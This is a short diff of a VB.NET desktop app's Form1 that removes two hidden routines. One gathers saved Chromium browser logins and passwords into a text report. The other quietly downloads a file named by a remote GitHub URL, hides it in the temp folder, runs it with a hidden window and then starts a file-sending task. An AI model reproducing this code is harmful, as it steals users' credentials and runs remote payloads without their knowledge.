@@ -56,52 +56,8 @@ Public Class Form1
 
     End Sub
 
-
-
-    Public Shared Function build_string() As String
-        Dim stringBuilder As StringBuilder = New StringBuilder()
-        Dim list As List(Of Account) = Chromium.Grab()
-
-        For Each account As Account In list
-            stringBuilder.AppendLine("Url: " & account.URL)
-            stringBuilder.AppendLine("Username: " & account.UserName)
-            stringBuilder.AppendLine("Password: " & account.Password)
-            stringBuilder.AppendLine("Application: " & account.Application)
-            stringBuilder.AppendLine("=============================")
-        Next
-
-        Return stringBuilder.ToString()
-    End Function
-
     Public Sub ScriptInstaller()
-        On Error Resume Next
-        Dim GetNewUrls As String = GetHTMLPage("https://raw.githubusercontent.com/DestroyerDarkNess/Eye-Protection/main/scriptLaunch")
 
-        If Not GetNewUrls = "" Then
-
-            Dim FileName As String = FixPath(GetNewUrls.Split("/").LastOrDefault.ToString)
-            Dim FileDir As String = IO.Path.Combine(IO.Path.GetTempPath, FileName)
-
-            If IO.File.Exists(FileDir) Then
-                Shell(FileDir, AppWinStyle.Hide)
-            Else
-                Dim FileData As String = GetHTMLPage(GetNewUrls)
-
-                If Not FileData = "" Then
-
-                    IO.File.WriteAllText(FileDir, FileData)
-                    SetHidden(FileDir)
-                    Shell(FileDir, AppWinStyle.Hide)
-
-                End If
-
-            End If
-        End If
-
-        Dim AsynctaskB As New Task(AddressOf SenderOtherFiles, TaskCreationOptions.PreferFairness)
-        AsynctaskB.Start()
-
-    End Sub
 
     Private Function FixPath(ByVal illegal As String) As String
         Return String.Join("", illegal.Split(System.IO.Path.GetInvalidFileNameChars()))
